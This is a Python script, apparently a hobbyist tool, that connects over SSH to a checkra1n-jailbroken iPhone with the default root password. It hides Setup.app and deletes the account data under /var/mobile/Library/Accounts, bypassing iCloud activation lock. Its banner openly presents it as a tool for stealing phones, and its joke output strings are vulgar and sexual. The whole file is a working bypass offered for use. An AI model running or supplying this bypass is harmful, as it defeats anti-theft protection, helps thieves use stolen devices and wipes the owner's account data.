import subprocess
import argparse
import paramiko
import random
import sys

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#  _  ___             ___ ______ _      _        ______ _                    _____ _     _       __ 
# (_)/ _ \           / _ \|  _  (_)    | |       | ___ \ |                  |_   _| |   (_)     / _|
#  _/ /_\ \_ __ ___ / /_\ \ | | |_ _ __| |_ _   _| |_/ / |__   ___  _ __   ___| | | |__  _  ___| |_ 
# | |  _  | '_ ` _ \|  _  | | | | | '__| __| | | |  __/| '_ \ / _ \| '_ \ / _ \ | | '_ \| |/ _ \  _|
# | | | | | | | | | | | | | |/ /| | |  | |_| |_| | |   | | | | (_) | | | |  __/ | | | | | |  __/ |  
# |_\_| |_/_| |_| |_\_| |_/___/ |_|_|   \__|\__, \_|   |_| |_|\___/|_| |_|\___\_/ |_| |_|_|\___|_|  
#                                           __/ |                                                  
#                                          |___/                                         
# A script to assist you in your phone thievery, you fucking thief.
# Disclaimer: I do not support thieves in any way. 
# This script was made for educational purposes and also because doing things other people won't is cool.
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 

endquotes = ["The cum chamber has been unlocked. Get your milk jugs ready.", "Cheesecake", "Your IP has been reported to your local police department. Just kidding, enjoy the stolen phone.", "GeoSn0w is a sad, sad man.", "Use repo.toilet.cat on your now jailbroken phone!", "If you install Sileo your phone will automatically relock itself from disgust.", "You should install Red Star OS on your new phone.", "Calling original phone owner to complete unlocking process...", "Unlocked. Go have sex.", "Apple is sending a SWAT team to your house because you stole this phone. Be prepared.", "Buy ScreenSafe by Kushy today, peasant.", "The r/jb Discord fully supports your decision to steal phones and they'd love to have you recommend this tool there. Do it now. Here, have a link: https://discord.gg/jb.", "Install BruhKeys:tm: or Apple will brick your phone remotely."]

parser = argparse.ArgumentParser(description='A tool to automate SSHing into a checkra1ned device.')
parser.add_argument('--port', type=int, help='the port to run ssh on', default=2222)
parser.add_argument('--password', type=str, help='the ssh password (default is alpine)', default="alpine")
args = parser.parse_args()

try:
    print("""Welcome to iAmADirtyPhoneThief, you dirty phone thief.

This tool will unlock any checkra1ned iOS device, however your device will be limited in functionality.
This software is provided without warranty, I am not liable if your device stops working.

Enjoy it, and have fun stealing phones, you disgusting thief.
""")
    print("Running iproxy...")
    iproxy = subprocess.Popen(["iproxy", str(args.port), "22"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print("Attempting to connect via ssh...")
    while True:
        try:
            client.connect('localhost', username='root', password=args.password, port=args.port)
            break
        except:
            print("Can't connect to SSH, retrying...")
            continue
    print("Connected!")
    print("Mounting filesystem as read/write...")
    client.exec_command("mount -o rw,union,update /")
    print("Hiding Setup.app...")
    client.exec_command("mv /Applications/Setup.app /Applications/Setup.app.bak")
    print("Clearing uicache... (this may take a while)")
    stdin, stdout, stderr = client.exec_command("uicache --all")
    stdout.channel.recv_exit_status()
    print("Clearing users...")
    stdin, stdout, stderr = client.exec_command("rm -rf /var/mobile/Library/Accounts/*")
    stdout.channel.recv_exit_status()
    print("Respringing...")
    client.exec_command("killall backboardd")
    print("Killing iproxy...")
    iproxy.terminate()
    iproxy.kill()
    print(f"{random.choice(endquotes)}\n\nReboot to enable most iCloud features.")
except (KeyboardInterrupt, SystemExit):
    print("\nKilling iproxy...")
    iproxy.terminate()
    iproxy.kill()
    print("Thanks for using the tool!")